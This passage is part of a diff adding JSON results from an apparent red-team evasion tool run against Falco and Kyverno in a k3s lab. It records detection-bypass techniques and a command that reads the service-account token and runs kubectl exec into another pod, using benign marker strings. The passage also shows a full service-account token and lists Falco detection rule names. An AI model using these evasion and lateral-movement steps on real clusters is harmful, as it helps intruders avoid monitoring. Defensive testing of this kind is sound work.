+          "raw": "10:07:08.443304973: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:57768->10.43.0.1:443 lport=57768 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        }
+      ],
+      "denials": [],
+      "result": "bypass-confirmed",
+      "limitations": "Directory selection only; this lab's Falco 0.45.1 bundled ruleset has no Write-below rule, so path selection is not directly observable.",
+      "detail": {
+        "technique": "path-evasion",
+        "ok": true,
+        "selected": "/dev/shm",
+        "monitored_paths": [
+          "/tmp",
+          "/var/tmp"
+        ],
+        "candidates": [
+          "/dev/shm",
+          "/tmp",
+          "/var/tmp",
+          "/run",
+          "/opt/inkblade"
+        ],
+        "reason": "selected a writable/exec workspace outside the HIDS-monitored set"
+      }
+    },
+    {
+      "id": "command-split-env-clean",
+      "product": "falco",
+      "action": "per-line short commands with env_clear",
+      "marker": "INKBLADE-BENIGN:split",
+      "marker_achieved": true,
+      "alerts": [],
+      "denials": [],
+      "result": "bypass-confirmed",
+      "limitations": "Command-line splitting is not a tamper-proof evasion; it only avoids long single-line signatures.",
+      "detail": {
+        "schema": "inkblade-bypass/1",
+        "ok": true,
+        "technique_id": "command-split-env-clean",
+        "techniques": [
+          "command-split-env-clean"
+        ],
+        "executions": [
+          {
+            "technique": "command-split-env-clean",
+            "ok": true,
+            "commands": 2,
+            "executions": [
+              {
+                "index": 0,
+                "command": "echo INKBLADE-BENIGN:split",
+                "exit_code": 0,
+                "timed_out": false
+              },
+              {
+                "index": 1,
+                "command": "id",
+                "exit_code": 0,
+                "timed_out": false
+              }
+            ],
+            "stdout": "INKBLADE-BENIGN:split\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n",
+            "clean_env": true,
+            "artifact_paths": []
+          }
+        ],
+        "fileless": false,
+        "artifact_paths": [],
+        "selected_path": null,
+        "scope": null,
+        "service_account": null,
+        "benign": true,
+        "no_new_binary": false
+      }
+    },
+    {
+      "id": "existing-binary-exec",
+      "product": "falco",
+      "action": "path-evasion + /bin/sh -c â†’ kubectl pods/exec into lateral-target",
+      "marker": "INKBLADE-BENIGN:defense-bypass:existing:100637",
+      "marker_achieved": true,
+      "alerts": [
+        {
+          "source": "falco",
+          "time": "10:07:07.250223001",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:57754->10.43.0.1:443 lport=57754 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:57754->10.43.0.1:443",
+            "lport": "57754",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "kubectl",
+            "proc_exepath": "/opt/inkblade/kubectl",
+            "parent": "inkblade-probe",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:07:07.250223001: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:57754->10.43.0.1:443 lport=57754 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:07:08.443304973",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:57768->10.43.0.1:443 lport=57768 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:57768->10.43.0.1:443",
+            "lport": "57768",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "kubectl",
+            "proc_exepath": "/opt/inkblade/kubectl",
+            "parent": "inkblade-probe",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:07:08.443304973: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:57768->10.43.0.1:443 lport=57768 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        }
+      ],
+      "denials": [],
+      "result": "bypass-confirmed",
+      "limitations": "Reuses /bin/sh from alpine:3.21; no new executable is written. The pods/exec API call itself is still visible to the Falco K8s API contact rule.",
+      "detail": {
+        "schema": "inkblade-bypass/1",
+        "ok": true,
+        "technique_id": "existing-binary-exec",
+        "techniques": [
+          "path-evasion",
+          "existing-binary-exec"
+        ],
+        "executions": [
+          {
+            "technique": "path-evasion",
+            "ok": true,
+            "selected": "/dev/shm",
+            "monitored_paths": [
+              "/tmp",
+              "/var/tmp"
+            ],
+            "candidates": [
+              "/dev/shm",
+              "/tmp",
+              "/var/tmp",
+              "/run",
+              "/opt/inkblade"
+            ],
+            "reason": "selected a writable/exec workspace outside the HIDS-monitored set"
+          },
+          {
+            "technique": "existing-binary-exec",
+            "ok": true,
+            "binary": "/bin/sh",
+            "binary_sha256": "aa1e1f4214ec2489ed373f3c5b92b7a7c665821a1decaa9685e5363886a93c7c",
+            "artifact_paths": [],
+            "no_new_binary": true,
+            "exit_code": 0,
+            "stdout": "",
+            "stderr": "",
+            "timed_out": false,
+            "argv": [
+              "/bin/sh",
+              "-c",
+              "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nexec /opt/inkblade/kubectl --server=https://kubernetes.default.svc --token=\"$TOKEN\" --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c 'echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker'\n"
+            ],
+            "result": {
+              "exit_code": 0,
+              "rc": 0,
+              "stdout": "",
+              "stderr": "",
+              "truncated": false,
+              "timed_out": false,
+              "duration_ms": 21178,
+              "argv": [
+                "/bin/sh",
+                "-c",
+                "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nexec /opt/inkblade/kubectl --server=https://kubernetes.default.svc --token=\"$TOKEN\" --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c 'echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker'\n"
+              ],
+              "clean_env": true,
+              "cwd": "/dev/shm"
+            }
+          }
+        ],
+        "fileless": false,
+        "artifact_paths": [],
+        "selected_path": "/dev/shm",
+        "scope": null,
+        "service_account": null,
+        "benign": true,
+        "no_new_binary": false
+      }
+    }
+  ],
+  "notes": [
+    "posture collect returned 0, products=['admission', 'falco']",
+    "Markers are benign INKBLADE-BENIGN strings; no real payload was used.",
+    "Alerts are attributed to technique families by rule name; a memfd execution may be detected even when the marker lands."
+  ],
+  "environment": {
+    "nodes": "NAME   STATUS   ROLES           AGE     VERSION        INTERNAL-IP   EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION           CONTAINER-RUNTIME\nk3s    Ready    control-plane   2d14h   v1.36.5+k3s1   10.0.2.15     <none>        Alpine Linux v3.24   6.18.58-0-virt (amd64)   containerd://2.3.4-k3s1.36",
+    "images": [
+      "alpine:3.21",
+      "docker.io/falcosecurity/falco:0.45.1",
+      "docker.io/library/alpine:3.21",
+      "python:3.12-alpine",
+      "rancher/local-path-provisioner:v0.0.37",
+      "rancher/mirrored-coredns-coredns:1.14.7",
+      "reg.kyverno.io/kyverno/kyverno:v1.19.2"
+    ],
+    "k3s_version": "v1.36.5+k3s1",
+    "probe_sha256": "7a6ca4216066d775df7d4c340ccd4dcf41cb6566a7a55cbef4afc4fc2adc596e",
+    "probe_size": 3211728,
+    "kubectl": "static-dl.k8s.io"
+  },
+  "graph": {
+    "posture_sha256": "e4d8fce6bf47db7d043be638c7bea72f0c2337d2c1b5bb3c1cab999f18010d7d",
+    "evidence": "ev-e4d8fce6bf47db7d",
+    "facts": [
+      "defense:admission",
+      "defense:falco"
+    ],
+    "gate_without_bypass": {
+      "allow": false,
+      "kind": "DefenseBypassRequired",
+      "reason": "检测到防护产品 ['admission', 'falco']；攻击性 intent 必须携带 bypass technique_id（可选 ['namespace-scope-evasion', 'sa-permission-selection', 'fileless-memfd-exec', 'existing-binary-exec', 'path-evasion', 'command-split-env-clean']）",
+      "status": "bypass-required",
+      "products": [
+        "admission",
+        "falco"
+      ],
+      "technique_id": "",
+      "product": "",
+      "stop": false,
+      "available": [
+        "namespace-scope-evasion",
+        "sa-permission-selection",
+        "fileless-memfd-exec",
+        "existing-binary-exec",
+        "path-evasion",
+        "command-split-env-clean"
+      ]
+    },
+    "gate_with_bypass": {
+      "allow": true,
+      "kind": "DefenseBypassSelected",
+      "reason": "使用 bypass path-evasion 规避 falco (score=0.6375)",
+      "status": "bypass-selected",
+      "products": [
+        "admission",
+        "falco"
+      ],
+      "technique_id": "path-evasion",
+      "product": "falco",
+      "stop": false,
+      "available": [
+        "namespace-scope-evasion",
+        "sa-permission-selection",
+        "fileless-memfd-exec",
+        "existing-binary-exec",
+        "path-evasion",
+        "command-split-env-clean"
+      ]
+    },
+    "policy_selected_technique": "path-evasion"
+  },
+  "posture": {
+    "products": [
+      {
+        "product": "admission",
+        "display": "kyverno",
+        "version": "reg.kyverno.io/kyverno/kyverno:v1.19.2",
+        "evidence": [
+          "process:kyverno",
+          "image:reg.kyverno.io/kyverno/kyverno:v1.19.2",
+          "admission:kyverno:3",
+          "admission:gatekeeper:0",
+          "process:kyverno /ko-app/kyverno --caSecretName=kyverno-svc.kyverno.svc.kyverno-tls-ca --tlsSecretName=kyverno-svc.kyverno.svc.ky"
+        ],
+        "sensor": {
+          "pods": [
+            {
+              "name": "kyverno-admission-controller-69f6769c79-jnbsk",
+              "namespace": "kyverno",
+              "phase": "Running",
+              "images": [
+                "reg.kyverno.io/kyverno/kyverno:v1.19.2"
+              ]
+            }
+          ]
+        },
+        "ruleset": null,
+        "policies": [
+          "defense-lab-disallow-hostpath",
+          "defense-lab-disallow-privileged",
+          "defense-lab-require-automount-false"
+        ],
+        "namespace": "trident-bypass",
+        "source": "probe.collect"
+      },
+      {
+        "product": "falco",
+        "display": "Falco",
+        "version": "docker.io/falcosecurity/falco:0.45.1",
+        "evidence": [
+          "process:falco",
+          "image:docker.io/falcosecurity/falco:0.45.1",
+          "ruleset:/proc/15639/root/etc/falco/falco_rules.yaml",
+          "process:falco /usr/bin/falco"
+        ],
+        "sensor": {
+          "running": true,
+          "pid": 15639,
+          "comm": "falco",
+          "btf": true,
+          "kernel_module": false,
+          "driver": "modern_ebpf_inferred",
+          "rulesets": 1
+        },
+        "ruleset": {
+          "product": "falco",
+          "path": "/proc/15639/root/etc/falco/falco_rules.yaml",
+          "sha256": "30a1a60263ab97650c851011468da03b17fc0096a7cfa3b6686eba5de73b865b",
+          "rule_count": 25,
+          "rules": [
+            "Directory traversal monitored file read",
+            "Read sensitive file trusted after startup",
+            "Read sensitive file untrusted",
+            "Run shell untrusted",
+            "System user interactive",
+            "Terminal shell in container",
+            "Contact K8S API Server From Container",
+            "Netcat Remote Code Execution in Container",
+            "Search Private Keys or Passwords",
+            "Clear Log Activities",
+            "Remove Bulk Data from Disk",
+            "Create Symlink Over Sensitive Files",
+            "Create Hardlink Over Sensitive Files",
+            "Packet socket created in container",
+            "Redirect STDOUT/STDIN to Network Connection in Container",
+            "Linux Kernel Module Injection Detected",
+            "Debugfs Launched in Privileged Container",
+            "Detect release_agent File Container Escapes",
+            "PTRACE attached to process",
+            "PTRACE anti-debug attempt",
+            "Find AWS Credentials",
+            "Execution from /dev/shm",
+            "Drop and execute new binary in container",
+            "Disallowed SSH Connection Non Standard Port",
+            "Fileless execution via memfd_create"
+          ],
+          "interesting_rules": [
+            "terminal-shell",
+            "k8s-api-contact",
+            "drop-execute"
+          ],
+          "parse": "rule: prefix lines"
+        },
+        "policies": [],
+        "namespace": "trident-bypass",
+        "source": "probe.collect"
+      }
+    ],
+    "namespace": "trident-bypass",
+    "scope": {
+      "namespace": "trident-bypass",
+      "labels": {
+        "kubernetes.io/metadata.name": "trident-bypass"
+      },
+      "policies_in_scope": [],
+      "error": null
+    },
+    "admission": {
+      "available": true,
+      "kyverno": {
+        "available": true,
+        "api": "policies.kyverno.io/v1 + kyverno.io/v1",
+        "count": 3,
+        "items": [
+          {
+            "name": "defense-lab-disallow-hostpath",
+            "scope": "[{\"expression\":\"request.namespace == 'defense-lab'\",\"name\":\"defense-lab-only\"}] {\"resourceRules\":[{\"apiGroups\":[\"\"],\"apiVersions\":[\"v1\"],\"operations\":[\"CREATE\",\"UPDATE\"],\"resources\":[\"pods\"]}]} ",
+            "scope_truncated": false
+          },
+          {
+            "name": "defense-lab-disallow-privileged",
+            "scope": "[{\"expression\":\"request.namespace == 'defense-lab'\",\"name\":\"defense-lab-only\"}] {\"resourceRules\":[{\"apiGroups\":[\"\"],\"apiVersions\":[\"v1\"],\"operations\":[\"CREATE\",\"UPDATE\"],\"resources\":[\"pods\"]}]} ",
+            "scope_truncated": false
+          },
+          {
+            "name": "defense-lab-require-automount-false",
+            "scope": "[{\"expression\":\"request.namespace == 'defense-lab'\",\"name\":\"defense-lab-only\"}] {\"resourceRules\":[{\"apiGroups\":[\"\"],\"apiVersions\":[\"v1\"],\"operations\":[\"CREATE\",\"UPDATE\"],\"resources\":[\"pods\"]}]} ",
+            "scope_truncated": false
+          }
+        ],
+        "errors": {
+          "modern": null,
+          "legacy": null
+        }
+      },
+      "gatekeeper": {
+        "available": true,
+        "api": "constraints.gatekeeper.sh",
+        "count": 0,
+        "items": []
+      }
+    },
+    "kernel_modules": [
+      "xt_physdev",
+      "nft_log",
+      "nft_limit",
+      "xt_NFLOG",
+      "nfnetlink_log",
+      "xt_limit",
+      "ip_set_hash_ip",
+      "xt_multiport",
+      "veth",
+      "nf_conntrack_netlink",
+      "xt_nat",
+      "xt_nfacct",
+      "ipt_REJECT",
+      "nf_reject_ipv4",
+      "xt_tcpudp",
+      "xt_mark",
+      "vxlan",
+      "ip6_udp_tunnel",
+      "udp_tunnel",
+      "xt_comment",
+      "nfnetlink_acct",
+      "xt_conntrack",
+      "xt_MASQUERADE",
+      "xfrm_user",
+      "xfrm_algo",
+      "xt_set",
+      "ip_set",
+      "nft_chain_nat",
+      "nf_nat",
+      "nf_conntrack",
+      "nf_defrag_ipv6",
+      "nf_defrag_ipv4",
+      "xt_addrtype",
+      "nft_compat",
+      "x_tables",
+      "nf_tables",
+      "nfnetlink",
+      "overlay",
+      "br_netfilter",
+      "bridge",
+      "stp",
+      "llc",
+      "af_packet",
+      "mousedev",
+      "psmouse",
+      "i2c_piix4",
+      "i2c_smbus",
+      "bochs",
+      "drm_client_lib",
+      "drm_shmem_helper",
+      "syscopyarea",
+      "sysfillrect",
+      "sysimgblt",
+      "fb_sys_fops",
+      "drm_kms_helper",
+      "drm",
+      "drm_panel_orientation_quirks",
+      "fb",
+      "i2c_core",
+      "evdev",
+      "kvm_amd",
+      "kvm",
+      "irqbypass",
+      "ghash_clmulni_intel",
+      "aesni_intel",
+      "gf128mul",
+      "qemu_fw_cfg",
+      "floppy",
+      "button",
+      "virtio_net",
+      "net_failover",
+      "failover",
+      "virtio_blk",
+      "virtio_rng",
+      "rng_core",
+      "sr_mod",
+      "cdrom",
+      "ata_generic",
+      "loop",
+      "ext4",
+      "crc16",
+      "mbcache",
+      "jbd2",
+      "usb_storage",
+      "usbcore",
+      "usb_common",
